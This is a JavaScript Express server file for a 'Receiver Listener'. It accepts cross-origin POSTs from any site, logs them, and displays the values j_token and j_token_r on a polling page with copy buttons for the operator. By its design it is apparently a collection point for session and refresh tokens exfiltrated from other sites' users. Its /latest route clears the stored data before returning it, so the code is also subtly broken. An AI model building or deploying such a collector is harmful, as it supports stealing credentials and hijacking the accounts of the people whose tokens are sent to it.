const express = require("express");

const app = express();

app.use(express.json());

app.use(express.static("public"));

app.use((req, res, next) => {

    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Content-Type");
    res.header("Access-Control-Allow-Methods", "POST, GET, OPTIONS");

    next();
});


app.get("/receiver", (req, res) => {

    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Receiver Listener</title>

<style>
body {
    font-family: Arial, sans-serif;
    padding: 20px;
}

.box {
    border: 1px solid #ddd;
    padding: 10px;
    margin-bottom: 15px;
    border-radius: 8px;
    position: relative;
}

.value {
    white-space: pre-wrap;
    word-break: break-word;
    background: #f5f5f5;
    padding: 10px;
    border-radius: 6px;
    margin-top: 8px;
}

.copyBtn {
    position: absolute;
    top: 10px;
    right: 10px;
    font-size: 12px;
    padding: 4px 8px;
    cursor: pointer;
}

</style>

</head>
<body>

<h2>Waiting for POST data...</h2>

<div class="box">
    <button class="copyBtn" onclick="copy('t1')">Copy</button>
    <strong>j_token</strong>
    <div id="t1" class="value">No data yet</div>
</div>

<div class="box">
    <button class="copyBtn" onclick="copy('t2')">Copy</button>
    <strong>j_token_r</strong>
    <div id="t2" class="value">No data yet</div>
</div>

<script>

console.log("Listener started...");

let lastData = {};

async function checkData() {
    try {
        const res = await fetch("/latest");
        const data = await res.json();

        if (data && (data.j_token || data.j_token_r)) {

            console.log("NEW DATA:", data);

            document.getElementById("t1").innerText =
                data.j_token || "No data yet";

            document.getElementById("t2").innerText =
                data.j_token_r || "No data yet";

            lastData = data;
        }

    } catch (e) {}
}

setInterval(checkData, 5000);


function copy(id) {
    const el = document.getElementById(id);
    const text = el.innerText;

    navigator.clipboard.writeText(text);
}

</script>

</body>
</html>
    `);

});


let lastData = null;


app.post("/receiver", (req, res) => {

    const data = req.body.message || {};

    console.log("=== DATA RECEIVED ===");
    console.log(data);

    lastData = data;

    res.json({ ok: true });

});


app.get("/latest", (req, res) => {
    lastData = null;
    res.json(lastData || {});
});


app.get("/", (req, res) => {
    res.send("Receiver is running");
});


app.listen(process.env.PORT || 3000, () => {
    console.log("Receiver listening");
});
